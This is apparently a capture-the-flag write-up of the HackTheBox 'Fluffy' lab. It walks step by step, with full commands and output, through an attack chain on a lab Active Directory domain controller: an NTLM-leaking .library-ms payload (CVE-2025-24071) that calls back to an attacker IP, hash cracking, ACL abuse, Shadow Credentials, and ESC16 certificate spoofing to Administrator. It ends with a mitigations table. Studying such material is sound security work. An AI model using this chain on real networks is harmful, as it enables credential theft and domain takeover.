---
title: "HackTheBox — Fluffy"
date: 2026-09-13
draft: false
description: "Fluffy (HTB Easy) writeup: CVE-2025-24071 (NTLM leak via .library-ms) → NetNTLMv2 cracking → BloodHound ACLs → Shadow Credentials → AD CS ESC16 UPN Spoofing → Administrator."
tags: ["HackTheBox", "Easy", "Windows", "ActiveDirectory", "SMB", "NTLM", "CVE-2025-24071", "BloodHound", "ShadowCredentials", "ADCS", "ESC16", "UPNSpoofing", "WinRM", "Certipy", "Responder"]
categories: ["HackTheBox"]
---

{{< lead >}}
Easy-rated Active Directory domain controller. The full chain: writable SMB share `IT` → **CVE-2025-24071** (`.library-ms` inside a `.zip` forces outbound SMB auth) → NetNTLMv2 cracking → **BloodHound** uncovers nested `GenericAll`/`GenericWrite` → **Shadow Credentials** on `winrm_svc` and `ca_svc` → **AD CS ESC16** (security extension disabled, weak UPN-based mapping) → `Administrator` impersonation.
{{< /lead >}}

**IP:** `10.129.232.88` · **OS:** Windows Server 2019 (DC) · **Difficulty:** Easy

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.88
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

The port set (Kerberos, LDAP, SMB, ADWS, WinRM) is characteristic of an **Active Directory domain controller**.

```bash
nmap -sC -sV -p389,636 10.129.232.88
```

```
389/tcp open  ldap  Microsoft Windows Active Directory LDAP
              (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: SAN: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

Domain `fluffy.htb`, controller `DC01`. The ~7-hour clock skew will matter for Kerberos later.

---

## 2. SMB Enumeration

Using the initial low-privilege credentials (`j.fleischman` : `J0elTHEM4n1990!`):

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
Disk        Permissions
----        -----------
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
IT          READ, WRITE
NETLOGON    READ ONLY
SYSVOL      READ ONLY
```

The `IT` share allows **read and write**. Listing its contents:

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' -r "IT"
```

```
Everything-1.4.1.1026.x64/
Everything-1.4.1.1026.x64.zip
KeePass-2.58/
KeePass-2.58.zip
Upgrade_Notice.pdf
```

---

## 3. Reviewing `Upgrade_Notice.pdf`

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --download "IT\Upgrade_Notice.pdf"
pdftotext 10.129.232.88-IT_Upgrade_Notice.pdf && cat 10.129.232.88-IT_Upgrade_Notice.txt
```

```
FLUFFY
Patch Announcement: Mandatory Timeslot Booking for Critical Updates

Recent Vulnerabilities
CVE ID              Severity
CVE-2025-24996       Critical
CVE-2025-24071       Critical
CVE-2025-46785       High
CVE-2025-29968       High
CVE-2025-21193       Medium
CVE-2025-3445        Low
```

The IT department inadvertently tells us exactly what to look for. **CVE-2025-24071** stands out: it leaks a victim's NTLM hash simply by having them interact with a malicious `.zip` containing a `.library-ms` file — and we already have write access to the `IT` share that IT staff presumably use.

---

## 4. CVE-2025-24071 — NTLM Leak via `.library-ms`

### Generating the payload

```bash
python3 cve_2025_24071.py -n test -i 10.10.15.193 -s IT
```

```
[+] Wrote ./test.library-ms
[+] Wrote ./test.zip
[+] Removed intermediate test.library-ms
[+] Done. Deliver ./test.zip to the target and get it extracted.
```

A `.library-ms` file can declare a remote folder (`\\<attacker_ip>\share`) as part of a Windows "library." When Windows Explorer indexes or previews the `.zip`, it tries to resolve that remote path — triggering an **outbound SMB authentication** with the user's NetNTLMv2 hash.

### Delivering the payload

```bash
smbclient '//10.129.232.88/IT' -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put test.zip
smb: \> exit
```

### Capturing the hash with Responder

```bash
responder -I tun0
```

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:ca1ffb03f3cc9670:15DBBA15BC9E5A63435D2638A2184133:0101...
```

User `p.agila` interacted with our file, leaking their hash.

### Cracking

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O --force
```

```
P.AGILA::FLUFFY:...:prometheusx-303
```

✅ **Credentials:** `p.agila` : `prometheusx-303`

---

## 5. Active Directory Enumeration with BloodHound

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
    -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88
```

```
INFO: Found AD domain: fluffy.htb
INFO: Found 1 computers
INFO: Found 10 users
INFO: Found 54 groups
```

In BloodHound, we mark `p.agila` as *owned* and check **Outbound Object Control → Transitive Object Control**:

1. `p.agila` ∈ group **`Service Account Managers`**
2. `Service Account Managers` has **`GenericAll`** over group **`Service Accounts`**
3. `Service Accounts` has **`GenericWrite`** over `ca_svc`, `winrm_svc`, and `ldap_svc`
4. `winrm_svc` ∈ **`Remote Management Users`** → can authenticate via WinRM

If we abuse `GenericAll` to add ourselves to `Service Accounts`, we inherit `GenericWrite` — and `GenericWrite` over an account allows a **Shadow Credentials** attack (adding an alternative public-key credential without knowing or changing the password).

---

## 6. ACL Abuse and Shadow Credentials

### Joining the `Service Accounts` group

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 \
    add groupMember 'service accounts' p.agila
```

```
[+] p.agila added to service accounts
```

```bash
echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

### Shadow Credentials on `winrm_svc`

`GenericWrite` over a user object allows modifying its `msDS-KeyCredentialLink` attribute. By adding a public key we control, we can authenticate as that account via **PKINIT** without knowing its password and recover its NT hash via U2U.

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

```
NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

### WinRM access and `user.txt`

```bash
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
632d5c032d30fcb8fe412a989fd97692
```

---

## 7. AD CS Enumeration — Finding ESC16

```bash
nxc ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
```

```
ADCS  Found PKI Enrollment Server: DC01.fluffy.htb
ADCS  Found CN: fluffy-DC01-CA
```

```bash
certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
```

```
[!] Vulnerabilities
ESC16 : Security Extension is disabled.
```

**ESC16:** the CA has the `szOID_NTDS_CA_SECURITY_EXT` security extension disabled. This extension normally embeds the requester's SID in issued certificates, binding them strongly to their AD account. Without it, the domain controller falls back to **weak `userPrincipalName` (UPN)-based mapping** when validating a certificate's identity — allowing impersonation of any account whose UPN we can match, including `Administrator`.

---

## 8. Exploitation — ESC16: UPN Spoofing to Impersonate `Administrator`

### Step 1 — Get `ca_svc` NT hash (with clock sync)

First attempt fails due to the clock skew detected by Nmap:

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
# [-] KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
ntpdate 10.129.232.88
# CLOCK: time stepped by 1112.160389
```

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

```
NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Step 2 — Spoof `ca_svc`'s UPN to `administrator`

With `GenericWrite` over `ca_svc` we can directly modify its `userPrincipalName`:

```bash
certipy account update -username 'ca_svc@fluffy.htb' \
    -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -user ca_svc -upn 'administrator'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : administrator
```

### Step 3 — Request a certificate while UPN is `administrator`

```bash
certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -target 'dc01.fluffy.htb' \
    -ca 'fluffy-DC01-CA' -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

The `User` template allows client authentication, and the issued certificate carries the UPN `ca_svc` held at that moment — `administrator`. Because ESC16 disables the security extension, the DC resolves identity by UPN rather than SID.

### Step 4 — Restore `ca_svc`'s original UPN (cleanup)

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
    -user ca_svc -upn 'ca_svc@fluffy.htb'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : ca_svc@fluffy.htb
```

### Step 5 — Authenticate with the certificate and get `Administrator`'s hash

```bash
certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

---

## 9. Root Flag

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b7fe7922d452282b47e804e10dae6701
```

---

## 10. Attack Chain

```
j.fleischman → writable SMB share "IT"
        ↓
Upgrade_Notice.pdf → CVE-2025-24071 identified as target
        ↓
test.zip (.library-ms) uploaded to IT share
        ↓
p.agila interacts → NetNTLMv2 hash captured by Responder
        ↓
hashcat → p.agila : prometheusx-303
        ↓
BloodHound: p.agila → GenericAll over "Service Accounts"
             → GenericWrite over ca_svc / winrm_svc / ldap_svc
        ↓
bloodyAD: p.agila joins "Service Accounts"
        ↓
certipy shadow auto → winrm_svc NT hash → WinRM → user.txt
        ↓
certipy find → ESC16 (security extension disabled on fluffy-DC01-CA)
        ↓
certipy shadow auto → ca_svc NT hash
        ↓
ca_svc UPN = "administrator" → certipy req (User template) → administrator.pfx
        ↓
ca_svc UPN restored → certipy auth → Administrator NT hash
        ↓
WinRM as Administrator → root.txt
```

---

## 11. Mitigations

| Vector | Mitigation |
|---|---|
| Writable SMB share `IT` for non-admin users | Apply least privilege to share ACLs; separate read-only distribution shares from upload/ticketing ones |
| CVE-2025-24071 (`.library-ms` in `.zip`) | Apply Microsoft patch; filter `.library-ms` in share content policies; block outbound NTLM to untrusted networks |
| NTLM hash crackable offline | Disable NTLM where possible and enforce Kerberos; strong password policy + SMB signing/channel binding |
| Overly permissive AD ACLs (`GenericAll`/`GenericWrite` nested via management groups) | Audit ACLs regularly with BloodHound; avoid delegation chains that ultimately grant control over privileged accounts |
| Shadow Credentials (`msDS-KeyCredentialLink`) | Monitor writes to the attribute; restrict which principals can write it |
| ESC16 (weak UPN-based certificate mapping) | Enable `StrongCertificateBindingEnforcement` on the CA; restrict which accounts can modify their own `userPrincipalName` |
| Elevated clock skew left uncorrected | Sync all hosts against a reliable NTP source |
